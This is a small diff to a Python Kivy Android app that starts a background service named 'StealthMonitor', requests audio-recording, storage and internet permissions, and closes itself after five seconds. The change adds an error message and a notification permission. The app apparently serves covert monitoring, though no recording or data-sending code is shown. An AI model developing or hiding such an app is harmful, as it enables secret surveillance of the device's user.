@@ -27,8 +27,8 @@ class MainApp(App):
         layout.add_widget(label)
         try:
             service.start_service('StealthMonitor', '')
-        except Exception:
-            pass
+        except Exception as e:
+            label.text += f"\n[color=ff0000]Service error: {e}[/color]"
         Clock.schedule_once(lambda dt: self.stop(), 5)
         return layout
 
@@ -38,7 +38,8 @@ class MainApp(App):
             Permission.WRITE_EXTERNAL_STORAGE,
             Permission.READ_EXTERNAL_STORAGE,
             Permission.INTERNET,
-            Permission.RECORD_AUDIO
+            Permission.RECORD_AUDIO,
+            "android.permission.POST_NOTIFICATIONS"  # هام جداً
         ]
         request_permissions(perms)
 
